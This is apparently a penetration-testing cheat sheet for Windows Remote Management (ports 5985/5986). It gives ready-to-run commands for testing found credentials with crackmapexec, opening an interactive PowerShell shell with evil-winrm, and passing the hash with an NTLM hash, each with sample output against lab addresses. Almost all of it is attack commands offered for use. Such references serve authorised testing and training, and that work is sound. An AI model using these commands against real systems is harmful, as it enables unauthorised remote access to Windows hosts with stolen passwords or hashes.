# WinRM (5985/5986)

### Check access with found creds

Pwn3d! = shell access — Remote management

```bash
crackmapexec winrm $IP -u <user> -p <pass>
```

<details>
<summary>Example Output</summary>

```
crackmapexec winrm 10.10.10.5 -u john -p Password123
WINRM  10.10.10.5  5985  DC01  [+] corp.local\john:Password123 (Pwn3d!)
(Pwn3d! = you can get a shell)
```
</details>

---

### Get shell

Interactive PowerShell — Full shell access

```bash
evil-winrm -i $IP -u <user> -p <pass>
```

<details>
<summary>Example Output</summary>

```
evil-winrm -i 10.10.10.5 -u john -p Password123
*Evil-WinRM* PS C:\Users\john\Documents> whoami
corp\john
(Interactive PowerShell session)
```
</details>

---

### Pass the hash

With NTLM hash — No password needed

```bash
evil-winrm -i $IP -u <user> -H <ntlm_hash>
```

<details>
<summary>Example Output</summary>

```
evil-winrm -i 10.10.10.5 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
*Evil-WinRM* PS C:\Users\Administrator>

(evil-winrm supports PTH natively with -H flag)
(No password needed, just the NT hash)
```
</details>

---
